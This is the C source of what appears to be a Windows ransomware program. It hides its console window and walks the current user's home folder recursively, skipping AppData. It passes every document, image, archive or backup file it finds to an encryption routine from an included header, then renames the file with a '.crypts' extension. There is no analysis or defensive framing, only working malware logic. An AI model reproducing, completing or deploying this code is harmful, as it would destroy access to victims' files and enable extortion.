#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <tchar.h>
#include <stdbool.h>
#include <shlwapi.h>
#include "encrypt.h"
#define BUFSIZE MAX_PATH

void Swluu(LPCTSTR lpFolder, LPCTSTR lpFilePattern){

	TCHAR FullPattern[MAX_PATH];
	TCHAR nomes[MAX_PATH];
	WIN32_FIND_DATA FindFile;
	HANDLE HfindA;
	
	PathCombine(FullPattern, lpFolder, _T("*"));
	HfindA = FindFirstFile(FullPattern, &FindFile);
	if(HfindA != INVALID_HANDLE_VALUE){
		do{

			if(FindFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
				if(strcmp(FindFile.cFileName, ".") !=0 && strcmp(FindFile.cFileName, "..") !=0){
					if(strcmp(FindFile.cFileName, "AppData") !=0 && strcmp(FindFile.cFileName, "recycle.3bin") !=0 ) {
						PathCombine(FullPattern, lpFolder, FindFile.cFileName);
						sleep(1);
						printf("%s\n", FullPattern);		
						Swluu(FullPattern, lpFilePattern);
					}
				}
			}else{

					char *exten[22];
					exten[0] = ".xls";
					exten[1] = ".pdf";
					exten[2] = ".txt";
					exten[3] = ".mdb";
					exten[4] = ".html";
					exten[5] = ".jpg";
					exten[6] = ".jpeg";
					exten[7] = ".xlsx";
					exten[8] = ".mov";
					exten[9] = ".mp4";
					exten[10] = ".csv";
					exten[11] = ".png";
					exten[12] = ".doc";
					exten[13] = ".key";
					exten[14] = ".pptx";
					exten[15] = ".html";
					exten[16] = ".psd";
					exten[17] = ".bkp";
					exten[18] = ".zip";
					exten[19] = ".rar";
					exten[20] = ".docx";

					const char ch = '.';
					char *ret;
					ret = strrchr(FindFile.cFileName, ch);

					for(int i=0;i<21;i++){

						if(strcmp(ret, exten[i]) !=0){


						}else{

									sleep(10);
									int hd=0;
									while(hd <10800){
										hd++;
									}
									int ms;
									printf("%s\n", FindFile.cFileName);
									PathCombine(FullPattern, lpFolder, FindFile.cFileName);
									Ferramenta(FullPattern);
									strcpy(nomes, FullPattern);
									printf("Hel\n");
									strcat(nomes, ".crypts");
									rename(FullPattern, nomes);

						}


					}


			}
		}while(FindNextFile(HfindA, &FindFile));
		FindClose(HfindA);
		
	}

}

int main(int argc, char *argv[]){  
	int *n;
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	TCHAR Url[MAX_PATH];
	char *sem;
	n = malloc(1024);
	url10 = getenv("USERNAME");
	char arraynome[] = "C:\\Users\\";
	PathCombine(Url, arraynome, url10);
	Swluu(_T(Url), _T("*"));
	free(n);
	
return 0;

}
